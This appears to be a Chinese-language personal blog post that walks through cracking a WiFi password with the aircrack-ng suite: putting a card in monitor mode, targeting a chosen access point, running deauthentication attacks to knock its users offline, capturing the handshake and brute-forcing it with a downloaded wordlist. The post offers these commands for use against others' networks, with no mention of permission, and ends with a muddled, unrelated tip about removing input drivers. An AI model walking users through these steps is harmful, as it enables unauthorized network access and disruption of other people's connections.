---
title: wifi密码破解
top: false
cover: false
toc: true
mathjax: true
date: 2023-01-16 06:29:43
password: d5e8139b6262895c208b9fd9e7a21ecba14eb00445638566fcb77bae14408691
summary: Wifi密码暴力破解，不一定成功
tags: wifi
categories: Linux
---

### aircrack-ng工具安装
> 如果你是Kali用户，那么可以跳过这一步，Kali自带，我们以Ubuntu为例：
```shell
sudo apt install aircrack-ng # 安装aircrack-ng 这个工具kali-linux默认安装了
```

### 查看无线网卡
```shell
airmon-ng # 查看可用的无线网卡一般以`w`开头
```

### 开启监听模式
```shell
airmon-ng start <网卡名称> # 指定无线网卡开启监听模式
```

### 扫描附近的无线网
```shell
airodump-ng <处于监听模式的网卡名称> # 用这个监听网卡扫描附近的无线网络

# airodump-ng wlp8s0mon
# BSSID: 无线 AP 的硬件地址
# PWR: 信号强度，值是负数，绝对值越小表示信号越强
# CH: 无线网络信道
# ENC: 加密方式，我们要破解的是 WPA2
# ESSID: 无线网络的名称
```

### 监听你想破解的无线网
```shell
airodump-ng -w <扫描结果保存的文件名> -c <无线网络信道> --bssid <目标无线 AP 的硬件地址> <处于监听模式的网卡名称> # 使用参数过滤扫描列表，确定扫描目标,可以出指定wifi哪些人在使用 只要有人链接这个wifi就会被抓包

# BSSID: 无线 AP 的硬件地址
# STATION: 用户设备的硬件地址
```

### 对无线AP或者用户设备发起ACK攻击
```shell
aireplay-ng -<攻击模式(0为下线)> <攻击次数(0为一直攻击)> -a 无线 AP 硬件地址> -c <用户设备硬件地址> <处于监听模式的网卡名称> # 使用 aireplay-ng 对目标设备发起ack攻击 让他强制下线 方便他重新链接抓包成功

aireplay-ng -<攻击模式(0为下线)> <攻击次数(0为一直攻击)> -a 无线 AP 硬件地址> <处于监听模式的网卡名称> # 使用 aireplay-ng 对无线AP设备发起ack攻击 让连接他的设备都下线 方便他重新链接抓包成功
```

### 破解密码
```shell
aircrack-ng -w 密码字典 <包含握手包的 cap 文件> # 使用 aircrack-ng 暴力破解 Wi-Fi 密码 成功会返回 KEY FOUND! 密码字典去网上下载多得很 
```

### 退出监听模式，连接无线网
```shell
airmon-ng stop <处于监听模式的无限网卡名称> # 无线网卡退出监听模式
```

### 使用命令连接网络
```shell
sudo systemctl start NetworkManager # 开启网络服务

ip addr 或者 ifconfig # 查看无线网卡名称(w开头得)

iwlist 无线网卡 scanning | grep -i essid # 扫描可用wifi

nmcli device wifi connect wifi名字 password wifi密码 ifname 无线网卡 # 用这个无线网卡链接指定wifi
```

### 卸载ubuntu系统的IO驱动，不让别人乱碰你得电脑
```shell
sudo apt install xserver-xorg-input-all # 安装

sudo apt autoremove xserver-xorg-input-all # 卸载
```

